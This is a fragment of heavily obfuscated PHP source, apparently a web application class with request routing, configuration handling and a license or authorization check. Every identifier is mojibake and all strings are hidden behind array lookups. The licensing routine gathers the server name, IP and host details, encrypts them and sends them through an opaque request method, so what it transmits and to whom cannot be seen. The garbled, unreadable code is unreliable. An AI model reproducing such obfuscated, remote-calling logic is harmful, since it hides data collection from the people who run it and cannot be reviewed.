$EÛÜğ÷ª¬¡[36]); $b–ñáÔÓÛ² = $c½’•Í–ŒÅ[558]; goto a¶ÃØ•›Ü; e²ßïÉ ×Î: $c½’•Í–ŒÅ =& $_SERVER[»„]; $EÛÜğ÷ª¬¡ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if ($GLOBALS[$EÛÜğ÷ª¬¡[22]][$EÛÜğ÷ª¬¡[28]] != $EÛÜğ÷ª¬¡[10]) { return; } goto EÙÎÅóªå; B†¨ßİŒ©…: $dË¨™Ôœ½ = $EÛÜğ÷ª¬¡[33]($dîù¿´±Çç, $CƒÛµ‚ƒ­); $Eˆá„Ñ“õ = $c½’•Í–ŒÅ[555]; if (!$Eˆá„Ñ“õ) { return; } goto b³á›¹­œÈ; c‚Á“©ö®: } public function run() { goto A”òÜ‰¬èº; FÒÕˆ ¥È: $FÀæ´ôøÜŠ = $GLOBALS[$e©³ß±Ğì¿[22]][$e©³ß±Ğì¿[23]]; $EÈï¬»êŠ = $AŸğóÒ…áÛ[563]; if (strlen($EÈï¬»êŠ) < $AŸğóÒ…áÛ[557]) { return; } goto aëˆ§Œ’Ú÷; Có² †ä¨“: $A‹¬é‘¦›¦ = $AŸğóÒ…áÛ[567]; $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][45]}(); $açˆºÁ˜Âè = $AŸğóÒ…áÛ[568]; goto AÏ§ÏŞ„Ë®; a—ãˆ¶Ş›Õ: if (strlen($Dæ”ÔêÛÂƒ) < $AŸğóÒ…áÛ[566]) { die; } $e©³ß±Ğì¿[39]($e©³ß±Ğì¿[43], MOD . $e©³ß±Ğì¿[1] . ST . $e©³ß±Ğì¿[1] . ACT); $_SERVER[$e©³ß±Ğì¿[44]] = $e©³ß±Ğì¿[6](ACTION); goto Có² †ä¨“; dæí ôËº„: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][38]}(); $bÕğ²îéĞå = $AŸğóÒ…áÛ[562]; while (strlen($bÕğ²îéĞå) < $AŸğóÒ…áÛ[557]) { if (!$bÕğ²îéĞå) { break; } $bÕğ²îéĞå++; } goto FÒÕˆ ¥È; a¤ªÉï¢‚: $e©³ß±Ğì¿[39]($e©³ß±Ğì¿[41], isset($FÀæ´ôøÜŠ[1]) && $FÀæ´ôøÜŠ[0] ? $FÀæ´ôøÜŠ[1] : $this->defaultController); $e©³ß±Ğì¿[39]($e©³ß±Ğì¿[42], isset($FÀæ´ôøÜŠ[2]) && $FÀæ´ôøÜŠ[0] ? $FÀæ´ôøÜŠ[2] : $this->defaultAction); $Dæ”ÔêÛÂƒ = $AŸğóÒ…áÛ[565]; goto a—ãˆ¶Ş›Õ; aëˆ§Œ’Ú÷: $C´ ¯øÊğÔ = $GLOBALS[$e©³ß±Ğì¿[22]][$e©³ß±Ğì¿[28]]; $fî‰Ş‚Õ²Ò = $AŸğóÒ…áÛ[564]; $e©³ß±Ğì¿[39]($e©³ß±Ğì¿[40], isset($FÀæ´ôøÜŠ[0]) && $FÀæ´ôøÜŠ[0] ? $FÀæ´ôøÜŠ[0] : $this->defaultModule); goto a¤ªÉï¢‚; A”òÜ‰¬èº: $AŸğóÒ…áÛ =& $_SERVER[»„]; $e©³ß±Ğì¿ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][37]}(); goto dæí ôËº„; AÏ§ÏŞ„Ë®: if (!$açˆºÁ˜Âè) { return; } if ($e©³ß±Ğì¿[19]($FÀæ´ôøÜŠ) >= 3) { $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][21]}($C´ ¯øÊğÔ); } else { $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][21]}(ACTION); } goto F›õŸÎ¡Ÿ; F›õŸÎ¡Ÿ: } private $bzhmb7a9f78b = array(); private $udxe21202512 = ''; public function ylon159036dd() { goto E©ÏÉ³©; d¥Šöò²¸»: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][51]}(); $B’ñì£Š¦ = $E„òŸ¬¥Ô[572]; if (strlen($B’ñì£Š¦) < $E„òŸ¬¥Ô[554]) { die; } goto d´‡ä„ÄÇ¦; cÑ™ŸéÛ×æ: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][48]}(); $F¤ã˜êŸ” = $E„òŸ¬¥Ô[570]; while ($F¤ã˜êŸ” < $E„òŸ¬¥Ô[557]) { if ($F¤ã˜êŸ” >= 0) { break; } $F¤ã˜êŸ”++; } goto b½ˆŒ¿Œ¹ä; d´‡ä„ÄÇ¦: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][52]}(); $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][3]}($b–Ç³¼ëÈİ[53], array($this, $b–Ç³¼ëÈİ[54])); $eÀÈ‘™ë = $E„òŸ¬¥Ô[573]; goto Eè†¹óÑĞâ; cĞ“‚èÆÛ‘: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][47]}(); $bìä£¶ß = $E„òŸ¬¥Ô[569]; if (!$bìä£¶ß) { die; } goto cÑ™ŸéÛ×æ; E©ÏÉ³©: $E„òŸ¬¥Ô =& $_SERVER[»„]; $b–Ç³¼ëÈİ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][46]}(); goto cĞ“‚èÆÛ‘; f“å“Ü°¨Ó: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][3]}($b–Ç³¼ëÈİ[57], array($this, $b–Ç³¼ëÈİ[58])); $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][3]}($b–Ç³¼ëÈİ[59], array($this, $b–Ç³¼ëÈİ[60])); goto d¤ÜÚæ‚ø; b½ˆŒ¿Œ¹ä: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][49]}(); $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][50]}(); $C‚Ø²Ô˜£Â = $E„òŸ¬¥Ô[571]; goto d¥Šöò²¸»; Eè†¹óÑĞâ: $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][3]}($b–Ç³¼ëÈİ[55], array($this, $b–Ç³¼ëÈİ[56])); $D¨†¿ ó­¬ = $E„òŸ¬¥Ô[574]; while ($D¨†¿ ó­¬ < $E„òŸ¬¥Ô[547]) { if ($D¨†¿ ó­¬ >= 0) { break; } $D¨†¿ ó­¬++; } goto f“å“Ü°¨Ó; d¤ÜÚæ‚ø: } public function jsue00bb6ac9($E®³ˆ¶Ñ´ò) { goto c„ƒì¿„¶¦; c¨Ç²çÉâœ: if (strlen($eŞ‰«£„õ) < $Eë¥Š‹ˆ‰å[557]) { return; } if ($D‘³È©öùà[104]($GLOBALS, $D‘³È©öùà[132]) && $this->config[$D‘³È©öùà[133]]) { $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[134]] = WEB_ROOT; } return $E®³ˆ¶Ñ´ò; goto cºÑä„¡¨¾; c·‚¦Êà: $F‘¡Ÿ£‰æ³ = $Eë¥Š‹ˆ‰å[580]; $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[113]] = $D‘³È©öùà[114]($_SERVER[$D‘³È©öùà[115]] . $d²êîŠ²‘Ò[$D‘³È©öùà[116]]); $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[117]] = $D‘³È©öùà[118]($D‘³È©öùà[119]()); goto Fô’«åŒËø; e‰±½ÙÊ¨ˆ: $D÷âßÂ…À = $Eë¥Š‹ˆ‰å[577]; if (strlen($D÷âßÂ…À) < $Eë¥Š‹ˆ‰å[566]) { die; } unset($E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[95]][$D‘³È©öùà[96]]); goto C“«ÅˆŒ¿¿; Fô’«åŒËø: $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[120]] = $this->udxe21202512; if ($d²êîŠ²‘Ò[$D‘³È©öùà[120]] != $D‘³È©öùà[121]) { $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[122]] = $d²êîŠ²‘Ò[$D‘³È©öùà[122]]; $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[123]] = $d²êîŠ²‘Ò[$D‘³È©öùà[123]]; $f•Ç§÷Ñ³£ = $D‘³È©öùà[124](10) . $this->udxe21202512 . $D‘³È©öùà[124](5); $E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[125]][$D‘³È©öùà[126]] = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][127]}($f•Ç§÷Ñ³£, $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[113]]); } if ($this->udxe21202512 == $D‘³È©öùà[121]) { $E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$D‘³È©öùà[99]][$D‘³È©öùà[107]] = 0; } goto AÃ¢İš÷„–; c„ƒì¿„¶¦: $Eë¥Š‹ˆ‰å =& $_SERVER[»„]; $D‘³È©öùà =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $d²êîŠ²‘Ò = $D‘³È©öùà[61]($D‘³È©öùà[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}(); goto Eªè²Á•ôÂ; C“«ÅˆŒ¿¿: unset($E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[95]][$D‘³È©öùà[97]]); $AÆùêñ›— = $Eë¥Š‹ˆ‰å[578]; while ($AÆùêñ›— < $Eë¥Š‹ˆ‰å[566]) { if ($AÆùêñ›— >= 0) { break; } $AÆùêñ›—++; } goto c£‡ùê°©Í; c£‡ùê°©Í: unset($E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$D‘³È©öùà[76]]); unset($E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$D‘³È©öùà[98]]); $E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$D‘³È©öùà[99]] = array($D‘³È©öùà[100] => (int) $AãÁ£¶×‰[$D‘³È©öùà[101]], $D‘³È©öùà[102] => $D‘³È©öùà[103]($D‘³È©öùà[104]($AãÁ£¶×‰, $D‘³È©öùà[105], array())), $D‘³È©öùà[106] => (int) $D‘³È©öùà[104]($AãÁ£¶×‰, $D‘³È©öùà[107], 0)); goto fÎœİˆ»Š‰; C¡Á½à˜Œ: while (strlen($bøĞ®‚çŠ©) < $Eë¥Š‹ˆ‰å[547]) { if (!$bøĞ®‚çŠ©) { break; } $bøĞ®‚çŠ©++; } foreach ($F–¬Ç»ìÕ as $eÃ±·¬ …¡) { $dÇåƒåŞ£É = $GLOBALS[$D‘³È©öùà[91]][$D‘³È©öùà[92]][$eÃ±·¬ …¡]; if (isset($d²êîŠ²‘Ò[$eÃ±·¬ …¡])) { $dÇåƒåŞ£É = $d²êîŠ²‘Ò[$eÃ±·¬ …¡]; } $E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$eÃ±·¬ …¡] = $dÇåƒåŞ£É; } $AãÁ£¶×‰ = $E®³ˆ¶Ñ´ò[$D‘³È©öùà[93]][$D‘³È©öùà[94]][$D‘³È©öùà[76]]; goto e‰±½ÙÊ¨ˆ; AÃ¢İš÷„–: $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[128]] = $D‘³È©öùà[104]($this->bzhmb7a9f78b, $D‘³È©öùà[129], $D‘³È©öùà[10]); $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[130]] = $D‘³È©öùà[104]($this->bzhmb7a9f78b, $D‘³È©öùà[131], $D‘³È©öùà[10]); $eŞ‰«£„õ = $Eë¥Š‹ˆ‰å[581]; goto c¨Ç²çÉâœ; fÎœİˆ»Š‰: $Aæ©ºåÅŠÊ = $Eë¥Š‹ˆ‰å[579]; while (strlen($Aæ©ºåÅŠÊ) < $Eë¥Š‹ˆ‰å[547]) { if (!$Aæ©ºåÅŠÊ) { break; } $Aæ©ºåÅŠÊ++; } $E®³ˆ¶Ñ´ò[$D‘³È©öùà[108]][$D‘³È©öùà[109]] = $D‘³È©öùà[110]($D‘³È©öùà[111])->{$_SERVER[Ú¦Ó«“Ö€Œû›][112]}(); goto c·‚¦Êà; Eªè²Á•ôÂ: $cœæßÆÄ«‘ = $Eë¥Š‹ˆ‰å[575]; $F–¬Ç»ìÕ = array($D‘³È©öùà[64], $D‘³È©öùà[65], $D‘³È©öùà[66], $D‘³È©öùà[67], $D‘³È©öùà[68], $D‘³È©öùà[69], $D‘³È©öùà[70], $D‘³È©öùà[71], $D‘³È©öùà[72], $D‘³È©öùà[73], $D‘³È©öùà[74], $D‘³È©öùà[75], $D‘³È©öùà[76], $D‘³È©öùà[77], $D‘³È©öùà[78], $D‘³È©öùà[79], $D‘³È©öùà[80], $D‘³È©öùà[81], $D‘³È©öùà[82], $D‘³È©öùà[83], $D‘³È©öùà[84], $D‘³È©öùà[85], $D‘³È©öùà[86], $D‘³È©öùà[87], $D‘³È©öùà[88], $D‘³È©öùà[89], $D‘³È©öùà[90]); $bøĞ®‚çŠ© = $Eë¥Š‹ˆ‰å[576]; goto C¡Á½à˜Œ; cºÑä„¡¨¾: } private function vbkuc94b4068() { goto E¬ÎÈÉ¾•™; Bî¼Ì×ï×: foreach ($aÇÛóÅŸ…™ as $A†ç•Ò¦Ï) { if (!isset($AÒºÎóğà[$A†ç•Ò¦Ï]) || !$AÒºÎóğà[$A†ç•Ò¦Ï]) { continue; } $A»§ƒÄÇ¾ô[$A†ç•Ò¦Ï] = $AÒºÎóğà[$A†ç•Ò¦Ï]; } $Eßñ«¤À»[13](array($Eßñ«¤À»[151], $Eßñ«¤À»[152]), $A»§ƒÄÇ¾ô); goto A‚•Š ºñ¸; fËç•ö‚¤: if ($this->udxe21202512 == $Eßñ«¤À»[121]) { return; } $aÇÛóÅŸ…™ = array($Eßñ«¤À»[153], $Eßñ«¤À»[154], $Eßñ«¤À»[155], $Eßñ«¤À»[156], $Eßñ«¤À»[157], $Eßñ«¤À»[158]); $AÒºÎóğà = $Eßñ«¤À»[61]($Eßñ«¤À»[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}(); goto B“¤İ˜ÏáÚ; B“¤İ˜ÏáÚ: $bõ³Åñ·Ô¿ = $F‡øŠ†ïÆ[584]; if (strlen($bõ³Åñ·Ô¿) < $F‡øŠ†ïÆ[566]) { die; } $A»§ƒÄÇ¾ô = array($Eßñ«¤À»[159] => $AÒºÎóğà[$Eßñ«¤À»[64]], $Eßñ«¤À»[160] => $AÒºÎóğà[$Eßñ«¤À»[65]], $Eßñ«¤À»[161] => $Eßñ«¤À»[10]); goto Bî¼Ì×ï×; E¬ÎÈÉ¾•™: $F‡øŠ†ïÆ =& $_SERVER[»„]; $Eßñ«¤À» =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if ($_SERVER[$Eßñ«¤À»[44]] == $Eßñ«¤À»[135]) { goto e™–Ò”–; fÎƒÀ§Ş: $Eßñ«¤À»[13](array($Eßñ«¤À»[151], $Eßñ«¤À»[152]), $A»§ƒÄÇ¾ô); $eâ ÜÔòê = $F‡øŠ†ïÆ[583]; if (!$eâ ÜÔòê) { return; } goto dÊÍ…İëë; dìŠ«ƒò¨Â: $A»§ƒÄÇ¾ô = array($Eßñ«¤À»[150] => $aºŒšª‚’…); $FÜäóœãÜ´ = $F‡øŠ†ïÆ[582]; if (!$FÜäóœãÜ´) { die; } goto fÎƒÀ§Ş; e™–Ò”–: $aºŒšª‚’… = array($Eßñ«¤À»[120] => $this->udxe21202512, $Eßñ«¤À»[136] => $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][137]}(), $Eßñ«¤À»[138] => $Eßñ«¤À»[61]($Eßñ«¤À»[139])->{$_SERVER[Ú¦Ó«“Ö€Œû›][140]}()); if ($this->udxe21202512 != $Eßñ«¤À»[121]) { $Bë†¿„«®ß = $Eßñ«¤À»[104]($this->bzhmb7a9f78b, $Eßñ«¤À»[141]); if ($Bë†¿„«®ß) { $aºŒšª‚’…[$Eßñ«¤À»[142]] = $Bë†¿„«®ß; $aºŒšª‚’…[$Eßñ«¤À»[143]] = $Eßñ«¤À»[144]($Eßñ«¤À»[104]($this->bzhmb7a9f78b, $Eßñ«¤À»[145])); $aºŒšª‚’…[$Eßñ«¤À»[146]] = $Eßñ«¤À»[104]($this->bzhmb7a9f78b, $Eßñ«¤À»[131]); } } $aºŒšª‚’… = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($Eßñ«¤À»[148]($aºŒšª‚’…), $Eßñ«¤À»[114]($Eßñ«¤À»[149])); goto dìŠ«ƒò¨Â; dÊÍ…İëë: } goto fËç•ö‚¤; A‚•Š ºñ¸: } private function fkiw778ec355() { goto A½‚õƒ‡³Õ; FÇ‰ÁÚƒáƒ: if (!isset($AØÔ®Šùºº[$a”à¶Ç±œ²[165]]) || $a”à¶Ç±œ²[24]($AØÔ®Šùºº[$a”à¶Ç±œ²[165]]) != 16) { $a”à¶Ç±œ²[166]($a”à¶Ç±œ²[167] . $AØÔ®Šùºº[$a”à¶Ç±œ²[165]], !1); } $BËØ£ŸÄê± = $a”à¶Ç±œ²[61]($a”à¶Ç±œ²[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($a”à¶Ç±œ²[116]); $BÂ–°ğÓÂ³ = array($a”à¶Ç±œ²[165] => $AØÔ®Šùºº[$a”à¶Ç±œ²[165]], $a”à¶Ç±œ²[168] => $a”à¶Ç±œ²[124](16), $a”à¶Ç±œ²[169] => $a”à¶Ç±œ²[149], $a”à¶Ç±œ²[170] => $a”à¶Ç±œ²[171], $a”à¶Ç±œ²[172] => $_SERVER[$a”à¶Ç±œ²[173]], $a”à¶Ç±œ²[174] => $_SERVER[$a”à¶Ç±œ²[175]], $a”à¶Ç±œ²[176] => $_SERVER[$a”à¶Ç±œ²[177]]); goto C¬â—øÉÆ–; cç’»à¹ÀÂ: $E¿ªÖÊ‰ÂÙ[$DšÜÈó‘¡Î] = $c»­”¤„¶ä; $f¼Ú«ÚÀ = $EÁÊôÉ—“Ì[592]; if (!$f¼Ú«ÚÀ) { return; } goto A”çÈ•Ä½â; CŞß×µÙò: $BÏ˜ªÏâ¡§ = $EÁÊôÉ—“Ì[591]; if (!$BÏ˜ªÏâ¡§) { return; } $E¿ªÖÊ‰ÂÙ = array(); goto cç’»à¹ÀÂ; e®Í†”Ïìè: if (!$a”à¶Ç±œ²[104]($GLOBALS, $a”à¶Ç±œ²[132])) { die; } $AØÔ®Šùºº = $GLOBALS[$a”à¶Ç±œ²[22]]; if (isset($AØÔ®Šùºº[$a”à¶Ç±œ²[163]])) { $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][164]}(); die; } goto FÇ‰ÁÚƒáƒ; b„ÙĞæÑÒ: $DšÜÈó‘¡Î = $a”à¶Ç±œ²[214]($a”à¶Ç±œ²[25]($eßÈšÍåäœ, 10, 16)); $c³«°Ä²íÀ = $EÁÊôÉ—“Ì[588]; if (!$c³«°Ä²íÀ) { return; } goto e„Ã¬Üøš; CÂ®äÍÛŒá: $D†ÔÇñƒ‰¯ = $a”à¶Ç±œ²[25]($a”à¶Ç±œ²[114]($Cí»áß½’[$a”à¶Ç±œ²[210]]), 10, 10); $b…Âøà”‡í = $D†ÔÇñƒ‰¯ . $Cí»áß½’[$a”à¶Ç±œ²[120]] . $Cí»áß½’[$a”à¶Ç±œ²[212]]; $Cí»áß½’[$a”à¶Ç±œ²[122]] = $a”à¶Ç±œ²[214]($a”à¶Ç±œ²[118]($this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($b…Âøà”‡í, $a”à¶Ç±œ²[215]))); goto Aà—ø÷•Àº; Aà—ø÷•Àº: $fÜ…æ»·— = $a”à¶Ç±œ²[124](16); $bïçòÑ¤œÕ = $fÜ…æ»·— . $Cí»áß½’[$a”à¶Ç±œ²[120]] . $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($a”à¶Ç±œ²[114]($Cí»áß½’[$a”à¶Ç±œ²[209]]), $fÜ…æ»·—); $aØ»¹™§ôÓ = $EÁÊôÉ—“Ì[586]; goto D¹Ä¬î×ê‰; A½‚õƒ‡³Õ: $EÁÊôÉ—“Ì =& $_SERVER[»„]; $a”à¶Ç±œ² =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if ($_SERVER[$a”à¶Ç±œ²[44]] != $a”à¶Ç±œ²[162]) { return; } goto e®Í†”Ïìè; bª§âôÂ°¤: if ($Cì‰êÊöç[$a”à¶Ç±œ²[217]] && $Cì‰êÊöç[$a”à¶Ç±œ²[217]] >= 1) { $a”à¶Ç±œ²[61]($a”à¶Ç±œ²[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][218]}($a”à¶Ç±œ²[219], $a”à¶Ç±œ²[220]); } $a”à¶Ç±œ²[61]($a”à¶Ç±œ²[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][221]}($Cí»áß½’); $eßÈšÍåäœ = $a”à¶Ç±œ²[114]($_SERVER[$a”à¶Ç±œ²[115]] . $a”à¶Ç±œ²[214]($BËØ£ŸÄê±) . $Cí»áß½’[$a”à¶Ç±œ²[210]]); goto b„ÙĞæÑÒ; D¹Ä¬î×ê‰: if (strlen($aØ»¹™§ôÓ) < $EÁÊôÉ—“Ì[566]) { die; } $Cí»áß½’[$a”à¶Ç±œ²[123]] = $a”à¶Ç±œ²[118]($a”à¶Ç±œ²[214]($this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($bïçòÑ¤œÕ, $a”à¶Ç±œ²[216]))); $e¢¸èá«„ = $EÁÊôÉ—“Ì[587]; goto bª§âôÂ°¤; A”çÈ•Ä½â: $a”à¶Ç±œ²[61]($a”à¶Ç±œ²[11])->{$_SERVER[Ú¦Ó«“Ö€Œû›][226]}($FÇùÜØäˆ[$a”à¶Ç±œ²[227]], array($a”à¶Ç±œ²[228] => $E¿ªÖÊ‰ÂÙ)); $a”à¶Ç±œ²[166]($a”à¶Ç±œ²[197]($a”à¶Ç±œ²[208]), !0); $fÑË÷Í¤Öˆ = $EÁÊôÉ—“Ì[593]; goto FŞ¡×Í·¨¡; B‹…§“øÛÜ: $Cì‰êÊöç = $aœº×Ò…íË[$a”à¶Ç±œ²[192]]; $Aà‰Æ½äàÏ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][199]}($Cì‰êÊöç[$a”à¶Ç±œ²[200]]); $C¸”õÈÒ‹ = $EÁÊôÉ—“Ì[585]; goto eÑ˜ˆÀøŠ; D‡±Ï¸èĞ‡: $eÌçé„¥ÁÈ = $EÁÊôÉ—“Ì[590]; if (strlen($eÌçé„¥ÁÈ) < $EÁÊôÉ—“Ì[547]) { return; } $FÇùÜØäˆ = $eå„‚§ÍØÂ[$a”à¶Ç±œ²[225]]; goto CŞß×µÙò; e„Ã¬Üøš: $c»­”¤„¶ä = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][127]}($a”à¶Ç±œ²[148]($Cì‰êÊöç), $eßÈšÍåäœ); $d˜ï‰ŒÆÏŞ = $EÁÊôÉ—“Ì[589]; $eå„‚§ÍØÂ = $a”à¶Ç±œ²[222]($a”à¶Ç±œ²[61]($a”à¶Ç±œ²[11])->{$_SERVER[Ú¦Ó«“Ö€Œû›][223]}(), $a”à¶Ç±œ²[224]); goto D‡±Ï¸èĞ‡; FŞ¡×Í·¨¡: if (strlen($fÑË÷Í¤Öˆ) < $EÁÊôÉ—“Ì[554]) { die; } goto b£ÖîÏ­…‚; eÑ˜ˆÀøŠ: if (!$Aà‰Æ½äàÏ || $Aà‰Æ½äàÏ != $a”à¶Ç±œ²[201]($Cì‰êÊöç[$a”à¶Ç±œ²[145]])) { $d¶×¿ÀÔáŸ = array($a”à¶Ç±œ²[202] => $a”à¶Ç±œ²[61]($a”à¶Ç±œ²[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($a”à¶Ç±œ²[116]), $a”à¶Ç±œ²[203] => $_SERVER[$a”à¶Ç±œ²[115]], $a”à¶Ç±œ²[204] => $a”à¶Ç±œ²[205](), $a”à¶Ç±œ²[174] => $_SERVER[$a”à¶Ç±œ²[175]]); $aè¯‰À¡ëÓ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][206]}($a”à¶Ç±œ²[148]($d¶×¿ÀÔáŸ)); $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][182]}($a”à¶Ç±œ²[207] . $aè¯‰À¡ëÓ); $a”à¶Ç±œ²[166]($a”à¶Ç±œ²[197]($a”à¶Ç±œ²[208]), !0); } $Cí»áß½’ = array($a”à¶Ç±œ²[209] => $BÂ–°ğÓÂ³[$a”à¶Ç±œ²[165]], $a”à¶Ç±œ²[210] => $Cì‰êÊöç[$a”à¶Ç±œ²[211]], $a”à¶Ç±œ²[212] => $a”à¶Ç±œ²[124](16), $a”à¶Ç±œ²[120] => $Cì‰êÊöç[$a”à¶Ç±œ²[213]]); if ($BÂ–°ğÓÂ³[$a”à¶Ç±œ²[168]]) { $Cí»áß½’[$a”à¶Ç±œ²[212]] = $BÂ–°ğÓÂ³[$a”à¶Ç±œ²[168]]; } goto CÂ®äÍÛŒá; C¬â—øÉÆ–: $dõÕçøõ£ = $a”à¶Ç±œ²[114]($_SERVER[$a”à¶Ç±œ²[115]] . $BËØ£ŸÄê±); if ($AØÔ®Šùºº[$a”à¶Ç±œ²[178]] == $a”à¶Ç±œ²[179]) { $D¬‘±²é²é = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($dõÕçøõ£, $a”à¶Ç±œ²[180]); $aè¯‰À¡ëÓ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][127]}($a”à¶Ç±œ²[148]($BÂ–°ğÓÂ³), $dõÕçøõ£ . $a”à¶Ç±œ²[181], 3); $a¾ÂÅŞÜ ğ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][182]}($a”à¶Ç±œ²[183] . $D¬‘±²é²é . $a”à¶Ç±œ²[184] . $aè¯‰À¡ëÓ, -1); $a”à¶Ç±œ²[166]($a¾ÂÅŞÜ ğ, !0); } else { if ($AØÔ®Šùºº[$a”à¶Ç±œ²[178]] == $a”à¶Ç±œ²[185]) { $e‰¡÷Ûà°Œ = $a”à¶Ç±œ²[25]($a”à¶Ç±œ²[114]($a”à¶Ç±œ²[186] . $dõÕçøõ£), 12, 15) . $a”à¶Ç±œ²[187]; $aè¯‰À¡ëÓ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][188]}($a”à¶Ç±œ²[2]($AØÔ®Šùºº[$a”à¶Ç±œ²[189]]), $e‰¡÷Ûà°Œ, 2); $aœº×Ò…íË = $a”à¶Ç±œ²[190]($aè¯‰À¡ëÓ, !0); if (!$a”à¶Ç±œ²[191]($aœº×Ò…íË) || !$a”à¶Ç±œ²[191]($aœº×Ò…íË[$a”à¶Ç±œ²[192]]) || $aœº×Ò…íË[$a”à¶Ç±œ²[165]] != !0) { $cÆ•‹²Ìª = $a”à¶Ç±œ²[193]; $dÅˆñ¥¿°Ê = $aœº×Ò…íË[$a”à¶Ç±œ²[192]] ? $a”à¶Ç±œ²[194] . $aœº×Ò…íË[$a”à¶Ç±œ²[192]] : $cÆ•‹²Ìª; $a”à¶Ç±œ²[166]($dÅˆñ¥¿°Ê, !1); } else { $BÂ–°ğÓÂ³[$a”à¶Ç±œ²[168]] = $aœº×Ò…íË[$a”à¶Ç±œ²[192]][$a”à¶Ç±œ²[195]]; } } else { $aœº×Ò…íË = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][182]}($a”à¶Ç±œ²[196], $BÂ–°ğÓÂ³, 10); } } if (!$a”à¶Ç±œ²[191]($aœº×Ò…íË) || !$a”à¶Ç±œ²[191]($aœº×Ò…íË[$a”à¶Ç±œ²[192]]) || $aœº×Ò…íË[$a”à¶Ç±œ²[165]] != !0) { $cÆ•‹²Ìª = $a”à¶Ç±œ²[197]($a”à¶Ç±œ²[198]); $dÅˆñ¥¿°Ê = $aœº×Ò…íË[$a”à¶Ç±œ²[192]] ? $a”à¶Ç±œ²[194] . $aœº×Ò…íË[$a”à¶Ç±œ²[192]] : $cÆ•‹²Ìª; $a”à¶Ç±œ²[166]($dÅˆñ¥¿°Ê, !1); } goto B‹…§“øÛÜ; b£ÖîÏ­…‚: } private function jihd3afa51d0() { goto EÊš×½Úİğ; EÊš×½Úİğ: $Eø”¡ »ÈË =& $_SERVER[»„]; $D´ôÀê»ó‡ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $D´ôÀê»ó‡[61]($D´ôÀê»ó‡[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][221]}(array($D´ôÀê»ó‡[209] => $D´ôÀê»ó‡[10], $D´ôÀê»ó‡[210] => $D´ôÀê»ó‡[10], $D´ôÀê»ó‡[120] => $D´ôÀê»ó‡[121], $D´ôÀê»ó‡[122] => $D´ôÀê»ó‡[10], $D´ôÀê»ó‡[123] => $D´ôÀê»ó‡[10])); goto C×Àé·ªÆ; a»Ó¢¸Ã¯‘: $this->bzhmb7a9f78b = array(); $this->udxe21202512 = $D´ôÀê»ó‡[121]; $AÙ³‹—¹ = $Eø”¡ »ÈË[595]; goto bôŠ½¼‹ê; C×Àé·ªÆ: $C„—‚½¡Ù­ = $Eø”¡ »ÈË[594]; while (strlen($C„—‚½¡Ù­) < $Eø”¡ »ÈË[557]) { if (!$C„—‚½¡Ù­) { break; } $C„—‚½¡Ù­++; } 